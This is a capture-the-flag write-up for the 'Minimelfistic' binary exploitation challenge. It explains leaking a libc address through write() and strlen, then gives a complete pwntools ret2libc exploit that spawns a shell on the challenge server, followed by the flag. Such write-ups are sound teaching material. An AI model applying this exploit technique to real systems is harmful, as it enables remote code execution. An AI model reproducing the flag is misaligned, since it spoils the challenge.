# Minimelfistic

## Challenge

Alarm system randomly determines when we are allowed to send input.

There is no `puts` or `printf`, but there is `write`.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

Because there is no `puts` or `printf`, we need to use `write` to leak addresses.

However, `write` requires length in RDX and we don't have a gadget to set it.

We can use `strlen` which uses RDX to store the address of the string temporarily in its internals, resulting in an extremely long string length passed to `write`.

Now, we can ret2libc as normal.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 139.59.180.40 --port 30345 minimelfistic
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('minimelfistic')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '139.59.180.40'
port = int(args.PORT or 30345)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

payload = flat({
    0x0: b'9',
    0x40 + 0x8: [
        rop.find_gadget(["pop rdi", "ret"])[0],
        exe.got["write"],
        exe.plt["strlen"],
        rop.find_gadget(["pop rdi", "ret"])[0],
        1,
        rop.find_gadget(["pop rsi", "pop r15", "ret"])[0],
        exe.got["write"],
        0,
        exe.plt["write"],
        exe.sym["main"],
        ],
    })

io.sendlineafter(b"> ", payload)

io.recvuntil(b"will not be deactivated!\n")
libc.address = u64(io.recvuntil(b'\x00').ljust(8, b'\x00')) - libc.sym["write"]
log.success(hex(libc.address))

payload = flat({
    0x0: b'9',
    0x40 + 0x8: [
        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["pop rdi", "ret"])[0],
        next(libc.search(b"/bin/sh")),
        libc.sym["system"],
        ],
    })

io.sendlineafter(b"> ", payload)

io.interactive()
```

## Flag

`HTB{S4nt4_15_n0w_r34dy_t0_g1v3_s0m3_g1ft5}`
